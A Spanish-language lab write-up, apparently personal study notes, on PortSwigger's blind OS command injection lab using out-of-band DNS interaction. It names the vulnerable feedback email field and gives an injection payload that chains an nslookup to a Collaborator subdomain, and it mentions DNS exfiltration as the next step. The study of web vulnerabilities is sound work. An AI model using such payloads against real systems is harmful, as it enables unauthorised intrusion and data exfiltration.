---
aliases:
  - OS Command Injection 004 - OOB interaction
  - blind command injection dns confirm
tags:
  - vuln/os-command-injection
  - example
  - portswigger
---

# 004 — Ciego out-of-band: confirmar por DNS (Collaborator)

> Lab: [Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band) · **Practitioner** · técnica → [[vulnerabilities/027-os-command-injection/os-command-injection|entry point]]

## ¿Por qué acá? (cuando no hay dir escribible)
- **En 003 leías la salida por un archivo web.** ¿Y si **no hay** dir escribible/servido, o el HTTP saliente está filtrado?
- **Salida:** hacé que el server te **"llame" afuera** por **DNS** (casi nunca filtrado). Usás **Burp Collaborator** como en [[vulnerabilities/007-ssrf/examples/006-ssrf-ciego-deteccion-oob|SSRF ciego]].

## Dónde se incrusta
- Mismo **`email`** del feedback (`POST /feedback/submit`).

## Cómo explotarlo
Generás un payload de Collaborator y lanzás un `nslookup` a ese subdominio:
```
email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
```
En Burp → **Collaborator → Poll now**.

## Verificación
- Aparece una **interacción DNS** desde el server del lab hacia tu subdominio → **command injection ciego confirmado**.

## Detalles que se pasan por alto
- **DNS > HTTP** para OOB: el egress de DNS casi siempre está abierto aunque bloqueen HTTP saliente.
- **Solo confirma que existe** — todavía no exfiltraste datos. Para meter la salida *dentro* del DNS → 005.
- Mismo motor mental que el **SSRF ciego**: no ves la respuesta, así que provocás un canal externo.

→ Siguiente: [[vulnerabilities/027-os-command-injection/examples/005-blind-oob-exfil|005 · OOB exfil (meter la salida en el DNS)]]
